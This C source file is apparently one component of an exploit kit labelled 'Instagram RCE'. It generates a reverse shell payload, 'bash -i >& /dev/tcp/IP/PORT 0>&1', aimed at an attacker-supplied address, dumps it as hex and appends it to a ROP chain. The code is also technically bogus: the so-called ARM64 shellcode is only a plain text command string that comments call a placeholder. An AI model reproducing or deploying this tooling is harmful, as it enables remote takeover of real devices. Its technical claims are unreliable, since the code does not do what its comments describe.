/*
 * ARM64 Shellcode Generator for Instagram RCE
 * Generates reverse shell shellcode
 */

#include "instagram_rce.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ARM64 Reverse Shell Shellcode
 *
 * Executes: /bin/bash -i >& /dev/tcp/IP:PORT 0>&1
 *
 * Assembly (ARM64):
 * mov x8, #221          // execve syscall
 * ldr x0, =0x...        // /bin/bash
 * ldr x1, =0x...        // argv
 * mov x2, #0            // envp
 * svc #0                // syscall
 *
 * However, for reverse shell we use:
 * 1. execve("/bin/sh", ["-i", "-c", "bash >& /dev/tcp/IP:PORT"], NULL)
 * 2. Or spawn nc process connected to attacker IP:PORT
 */

/* Generate ARM64 shellcode for reverse shell */
arm64_shellcode_t* generate_reverse_shell_shellcode(const char *attacker_ip,
                                                     uint16_t attacker_port) {
    printf("\n[*] ATOM 7-1: ARM64 Shellcode Generation\n");

    arm64_shellcode_t *sc = malloc(sizeof(arm64_shellcode_t));
    if (!sc) {
        printf("[-] Memory allocation failed\n");
        return NULL;
    }

    /* Parse attacker endpoint */
    strncpy(sc->attacker_ip, attacker_ip, 15);
    sc->attacker_port = attacker_port;

    printf("[+] Attacker Endpoint: %s:%u\n", sc->attacker_ip, sc->attacker_port);

    /* ARM64 Shellcode Buffer - Placeholder
     *
     * Real shellcode would be:
     * - Syscall: execve (SyscallID #221)
     * - Path: /bin/bash or /system/bin/sh
     * - Argv: ["-i", "-c", "bash >& /dev/tcp/IP:PORT"]
     * - Envp: NULL
     *
     * For now, we allocate 512 bytes as maximum shellcode size
     */
    sc->code = malloc(512);
    if (!sc->code) {
        printf("[-] Shellcode buffer allocation failed\n");
        free(sc);
        return NULL;
    }

    /* Create a simple reverse shell command string (will be executed via system()) */
    char cmd_str[256];
    snprintf(cmd_str, sizeof(cmd_str),
             "bash -i >& /dev/tcp/%s/%u 0>&1",
             sc->attacker_ip, sc->attacker_port);

    printf("[+] Reverse Shell Command: %s\n", cmd_str);

    /* ARM64 Shellcode Stub (Real shellcode would be actual bytecode) */
    sc->size = strlen(cmd_str) + 1;
    memcpy(sc->code, cmd_str, sc->size);

    printf("[+] Shellcode Size: %zu bytes\n", sc->size);
    printf("[+] Shellcode Type: Reverse Shell (ARM64)\n");

    return sc;
}

/* Free shellcode */
void free_shellcode(arm64_shellcode_t *sc) {
    if (sc) {
        if (sc->code) free(sc->code);
        free(sc);
    }
}

/* Print shellcode hex */
void print_shellcode_hex(arm64_shellcode_t *sc) {
    printf("\n[*] ATOM 7-2: Shellcode Hex Dump\n");
    printf("[+] Shellcode Payload (%zu bytes):\n", sc->size);
    printf("    ");

    for (size_t i = 0; i < sc->size && i < 64; i++) {
        printf("%02x ", sc->code[i]);
        if ((i + 1) % 16 == 0) printf("\n    ");
    }

    if (sc->size > 64) {
        printf("... (%zu bytes total)\n", sc->size);
    } else {
        printf("\n");
    }
}

/* Embed shellcode into ROP chain */
int embed_shellcode_in_rop_chain(uint8_t *rop_chain, size_t rop_size,
                                  arm64_shellcode_t *sc) {
    printf("\n[*] ATOM 7-3: ROP Chain + Shellcode Integration\n");

    if (rop_size < sc->size + 32) {
        printf("[-] ROP chain too small for shellcode\n");
        return -1;
    }

    /* Append shellcode to ROP chain */
    memcpy(rop_chain + rop_size - 32, sc->code, sc->size);

    printf("[+] Shellcode embedded into ROP chain\n");
    printf("[+] Total Payload: %zu bytes\n", rop_size + sc->size);

    return 0;
}

